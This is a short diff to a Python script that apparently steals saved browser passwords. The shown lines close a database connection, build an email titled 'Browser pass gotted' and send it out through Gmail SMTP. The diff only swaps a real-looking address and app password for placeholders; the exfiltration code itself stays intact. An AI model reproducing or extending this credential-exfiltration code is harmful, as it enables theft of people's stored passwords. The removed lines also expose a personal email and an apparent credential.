@@ -61,8 +61,8 @@ def main():
     cursor.close()
     db.close()
 
-    email_user = "vkrmtemp@gmail.com"
-    email_sent = "vkrmtemp@gmail.com"
+    email_user = "example@gmail.com"
+    email_sent = "example@gmail.com"
     subject = "Browser pass gotted"
 
     msg = MIMEMultipart()
@@ -81,7 +81,7 @@ def main():
     text = msg.as_string()
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login(email_user, "mmfr apud ignj jkoh")
+    server.login(email_user, "App-Password")
     server.sendmail(email_user, email_sent, text)
     server.quit()
 if __name__ == "__main__":
